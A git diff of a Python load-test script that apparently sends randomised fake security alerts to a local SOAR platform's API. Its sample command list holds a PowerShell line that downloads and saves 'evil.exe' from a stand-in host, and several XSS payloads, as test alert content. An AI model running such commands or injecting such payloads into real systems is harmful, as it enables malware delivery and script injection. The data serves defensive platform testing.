@@ -1,16 +1,25 @@
 import json
-import random
 import datetime
 import hashlib
 import base64
 import requests
 import time
+import random
+import socket
+import struct
+import sys
 
 host = 'http://localhost'
 
+AUTH_TOKEN = None
+
+USERNAME = sys.argv[1]
+PASSWORD = sys.argv[2]
+EVENT_COUNT = int(sys.argv[3])
+
 def auth():
     response = requests.post('{}/api/v2.0/auth/login'.format(host),
-                             data=json.dumps({'username':'admin', 'password':'reflex'}),
+                             data=json.dumps({'email':USERNAME, 'password':PASSWORD}),
                              headers={'Content-Type': 'application/json'}, verify=False)
     if response.status_code == 200:
         token = response.json()['access_token']
@@ -51,7 +60,8 @@ def case_templates():
 
 def random_title_description():
   titles = [
-    {'User added to local admins': 'Someone added a normal user to local admins'},
+    {'Rule Testing': 'A test event used for rule testing'},
+    {'User added to local administrators': 'Someone added a normal user to local admins'},
     {'Suspicious DNS hit': 'A machine made a request for a suspicious DNS record'},
     {'Local account discovery': 'A machine exhibited enumeration behavior'},
     {'CVE-2021-40444': 'Remote code execution via malicious document in word'}
@@ -60,7 +70,7 @@ def random_title_description():
   return titles[random.randint(0, len(titles)-1)]
 
 def random_severity():
-  return random.randint(0,3)
+  return random.randint(1,4)
 
 def random_host_name():
   names = [
@@ -77,7 +87,9 @@ def random_host_name():
 
 def random_username():
   users = [
-    'brian',
+    'butters',
+    'svc_justin',
+    'bro',
     'joe',
     'jonathan',
     'dave',
@@ -88,7 +100,8 @@ def random_username():
     'adam',
     'matthew',
     'administrator',
-    'system'
+    'system',
+    'brian'
   ]
 
   return users[random.randint(0, len(users)-1)]
@@ -104,6 +117,9 @@ def random_enumeration_command():
 
   return commands[random.randint(0,len(commands)-1)]
 
+def random_ip():
+  return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+
 def random_powershell_command():
   commands = [
     'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
@@ -113,7 +129,9 @@ def random_powershell_command():
     'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
     '<IMG SRC="javascript:alert(\'XSS\');">',
     '<IMG SRC=javascript:alert(\'XSS\')>',
-    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'
+    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
+    '<script>alert(\'xss\')</script>'
+    '<iframe src="http://docs.reflexsoar.com/en/latest/"/>'
   ]
 
   return commands[random.randint(0, len(commands)-1)]
@@ -125,6 +143,7 @@ def random_event():
   signature_values = [alert_title, username, hostname]
   event_hasher = hashlib.md5()
   event_hasher.update(str(signature_values).encode())
+  ip = random_ip()
   
   alerts = [
     {
@@ -133,7 +152,8 @@ def random_event():
       "reference": reference(),
       "tags": [
         "enumeration",
-        "T1262"
+        "T1262",
+        "awesome: None"
       ],
       "tlp": 2,
       "source": "load_test.py",
@@ -151,6 +171,19 @@ def random_event():
           "original_source_field": "agent.hostname",
           "tags": [
             "source-host", "windows", "internal"
+          ]
+        },
+        {
+          "value": "69293121724f2096e5afd92aa822f95a2407b19f2cc57a426eec24f291e37362",
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "sha256hash",
+          "source_field": "hash.sha256",
+          "original_source_field": "hash.sha256",
+          "tags": [
+            "hash"
           ]
         },
         {
@@ -202,9 +235,65 @@ def random_event():
           "tags": [
             "command"
           ]
+        },
+        
+        {
+          "value": "101.254.99.130",
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "ip",
+          "source_field": "source_ip",
+          "tags": [
+            "firewall",
+            "source-ip"
+          ]
+        },
+        {
+          "value": ip,
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "ip",
+          "source_field": "source_ip",
+          "tags": [
+            "firewall",
+            "source-ip"
+          ]
+        },
+        {
+          "value": random_ip(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "ip",
+          "source_field": "source_ip",
+          "tags": [
+            "firewall",
+            "destination-ip"
+          ]
+        },
+        {
+          "value": random_ip(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "data_type": "auto",
+          "source_field": "source_ip",
+          "tags": [
+            "firewall",
+            "source"
+          ]
         }
       ],
-      "raw_log": "something something dark side"
+      #"raw_log": json.dumps({"destination":{"ip": ip}})
+      "raw_log": json.dumps({'raw_log': {'match_body': {'event_data': {'TargetUserName': 'svc_justin'}}}})
+      
+      
     }
   ]
 
@@ -213,7 +302,7 @@ def random_event():
 
 while True:
   events = []
-  for i in range(0,25):
+  for i in range(0,EVENT_COUNT):
     headers = {
       'Content-Type': 'application/json'
     }
@@ -227,4 +316,5 @@ while True:
 
   print("Sending {} events...".format(len(events)))
   bulk(events)
-  time.sleep(5)
+  time.sleep(1)
+  break
